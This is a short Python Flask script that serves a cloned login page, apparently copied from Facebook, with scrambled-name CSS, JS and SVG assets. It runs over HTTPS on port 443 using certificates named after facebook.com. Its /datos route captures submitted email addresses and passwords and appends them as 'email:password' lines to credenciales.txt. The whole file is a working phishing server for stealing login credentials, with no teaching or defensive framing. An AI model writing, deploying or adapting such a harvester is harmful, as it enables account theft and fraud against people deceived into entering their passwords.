from flask import Flask, request ,Response

app = Flask(__name__)

@app.route('/')
def index():
	return Response(open('index.html',encoding='UTF8').read(), mimetype="text/html")

@app.route('/js/SNXj2TYwEuC.js')
def escript():
	return Response(open('js/SNXj2TYwEuC.js',encoding='UTF8').read(), mimetype="text/javascript")

@app.route('/imgs/dF5SId3UHWd.svg')
def imagen():
	return Response(open('imgs/dF5SId3UHWd.svg',encoding='UTF8').read(), mimetype="image/svg+xml")

@app.route('/css/1FPNULrhhBJ.css')
def estilo1():
	return Response(open('css/1FPNULrhhBJ.css',encoding='UTF8').read(), mimetype="text/css")

@app.route('/css/8osHrRoPrcP.css')
def estilo2():
	return Response(open('css/8osHrRoPrcP.css',encoding='UTF8').read(), mimetype="text/css")

@app.route('/css/8uGPm-ERpxk.css')
def estilo3():
	return Response(open('css/8uGPm-ERpxk.css',encoding='UTF8').read(), mimetype="text/css")

@app.route('/css/KxGJ10xTR_J.css')
def estilo4():
	return Response(open('css/KxGJ10xTR_J.css',encoding='UTF8').read(), mimetype="text/css")

@app.route('/css/N3CLkSu0qgr.css')
def estilo5():
	return Response(open('css/N3CLkSu0qgr.css',encoding='UTF8').read(), mimetype="text/css")

@app.route('/css/RsN05coJNNv.css')
def estilo6():
	return Response(open('css/RsN05coJNNv.css',encoding='UTF8').read(), mimetype="text/css")

@app.route('/css/ZAblWptIXm4.css')
def estilo7():
	return Response(open('css/ZAblWptIXm4.css',encoding='UTF8').read(), mimetype="text/css")


@app.route('/datos', methods=['POST'])
def datos():
	email = request.form.get('email')
	password = request.form.get('password')
	file = open('credenciales.txt', 'a')
	file.write(email)
	file.write(":")
	file.write(password)
	file.write("\n")
	file.close()
	return 'GUARDADO'

#app.run(host='0.0.0.0', port=8080)
app.run(host='0.0.0.0', port=443, ssl_context=('facebook.com.crt', 'facebook.com.key'))
